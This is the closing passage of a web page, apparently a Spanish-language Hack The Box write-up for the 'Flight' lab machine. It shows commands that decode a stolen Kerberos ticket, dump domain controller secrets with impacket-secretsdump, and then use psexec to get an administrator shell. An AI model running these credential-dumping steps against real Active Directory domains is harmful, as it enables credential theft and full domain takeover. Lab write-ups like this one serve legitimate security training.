<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">cat ticket</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">b64</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#393A34;--shiki-dark:#BABED8"> base64 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">d </span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> ticket</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">kirbi</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">kirbi2ccache ticket</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">kirbi</span><span style="color:#393A34;--shiki-dark:#BABED8"> ticket</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">ccache</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">sudo ntpdate </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">u flight</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">htb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#BABED8">KRB5CCNAME</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#393A34;--shiki-dark:#BABED8">ticket</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">ccache</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">impacket</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">secretsdump </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">k </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">no</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">pass</span><span style="color:#393A34;--shiki-dark:#BABED8"> g0</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">flight</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">htb</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -</span><span style="color:#393A34;--shiki-dark:#BABED8">just</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">dc</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">user Administrator </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">target</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ip </span><span style="color:#2F798A;--shiki-dark:#F78C6C">10.129</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">42</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">88</span></span></code></pre> 
<img src="/src/assets/images/Img/20240810194913.png"/>
<p><code>impacket-secretsdump</code>
una ves hemos dumpeado las credenciales de administrador podemos establecer una conexión usando  <code>impacket-psexec</code> ya que el usuario administrador no tiene permisos en el grupo <code>REMOTE MANAGEMENT USER</code></p>
<img src="/src/assets/images/Img/20240810201316.png"/>
<h2 id="we-are-root">WE ARE ROOT</h2> </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/2024-10-09_19-32.8zKcXjnx_WsAT9.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Analysis" width="200" height="200" loading="lazy" decoding="async" class="rounded-md w-full max-h-[300px] md:max-h-[500px] object-cover"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/analysis/"> Analysis </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/Authority.X1lR3K3b_1kRP9X.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Authority" width="200" height="200" loading="lazy" decoding="async" class="rounded-md w-full max-h-[300px] md:max-h-[500px] object-cover"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/authority/"> Authority </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/Blazorized.dwuuMPpg_Zoc1mI.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Blazorized" width="200" height="200" loading="lazy" decoding="async" class="rounded-md w-full max-h-[300px] md:max-h-[500px] object-cover"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/blazorized/"> Blazorized </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Your Name. All rights reserved.
</footer> </main>    </body> </html> 